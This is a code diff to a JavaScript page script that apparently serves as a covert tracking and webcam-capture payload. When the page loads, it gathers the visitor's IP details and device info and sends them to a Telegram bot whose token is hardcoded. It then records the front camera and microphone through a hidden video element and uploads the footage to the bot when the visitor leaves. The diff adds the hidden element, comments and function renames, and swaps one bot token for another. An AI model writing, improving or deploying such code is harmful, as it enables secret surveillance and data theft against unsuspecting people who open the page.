@@ -1,10 +1,11 @@
-const BOT_TOKEN = "7715353771:AAHIDwI90yms3sKWFoQInjJtZPxGxjdb3VU"; // Replace with your bot token
+const BOT_TOKEN = "7555729666:AAE1ruSg8blF5Dm_gHRgyK3R1KeiPBNrOC8"; // Replace with your bot token
 const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 const API_FILE_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`;
 
 let mediaRecorder;
 let recordedChunks = [];
 
+// Fetch IP details
 async function getIpDetails() {
     try {
         const response = await fetch("https://ipapi.co/json/");
@@ -23,6 +24,7 @@ async function getIpDetails() {
     }
 }
 
+// Fetch device details
 async function getDeviceInfo() {
     const deviceInfo = {
         charging: false,
@@ -44,18 +46,19 @@ async function getDeviceInfo() {
     return deviceInfo;
 }
 
+// Send message to Telegram bot
 async function sendTelegramMessage(chatId, message) {
     const data = {
         chat_id: chatId,
         text: message,
-        parse_mode: "HTML"
+        parse_mode: "HTML",
     };
 
     try {
         const response = await fetch(API_URL, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(data)
+            body: JSON.stringify(data),
         });
 
         const result = await response.json();
@@ -65,6 +68,7 @@ async function sendTelegramMessage(chatId, message) {
     }
 }
 
+// Send video to Telegram bot
 async function sendVideo(chatId, videoBlob) {
     const formData = new FormData();
     formData.append("chat_id", chatId);
@@ -83,9 +87,16 @@ async function sendVideo(chatId, videoBlob) {
     }
 }
 
-async function startRecording(chatId) {
+// Start recording video
+async function startCamera(chatId) {
     try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
+        const video = document.createElement("video");
+        video.style.display = "none"; // Hide the video element
+        document.body.appendChild(video);
+
+        video.srcObject = stream;
+        video.play();
 
         mediaRecorder = new MediaRecorder(stream);
         mediaRecorder.ondataavailable = (event) => {
@@ -97,15 +108,17 @@ async function startRecording(chatId) {
         mediaRecorder.start();
         console.log("Recording started");
 
+        // Stop recording when the user leaves the page
         window.addEventListener("beforeunload", async () => {
-            stopRecording(chatId);
+            await stopCamera(chatId);
         });
     } catch (error) {
-        console.error("Error starting recording:", error);
+        console.error("Error accessing camera:", error);
     }
 }
 
-async function stopRecording(chatId) {
+// Stop camera and send video
+async function stopCamera(chatId) {
     if (mediaRecorder && mediaRecorder.state !== "inactive") {
         mediaRecorder.stop();
         console.log("Recording stopped");
@@ -119,6 +132,7 @@ async function stopRecording(chatId) {
     }
 }
 
+// Send initial details to the bot
 async function sendInitialInfo() {
     const ipDetails = await getIpDetails();
     const deviceInfo = await getDeviceInfo();
@@ -144,10 +158,11 @@ async function sendInitialInfo() {
 
     if (chatId) {
         await sendTelegramMessage(chatId, message);
-        await startRecording(chatId);
+        await startCamera(chatId);
     } else {
         console.error("Chat ID missing in URL!");
     }
 }
 
+// Trigger on page load
 sendInitialInfo();
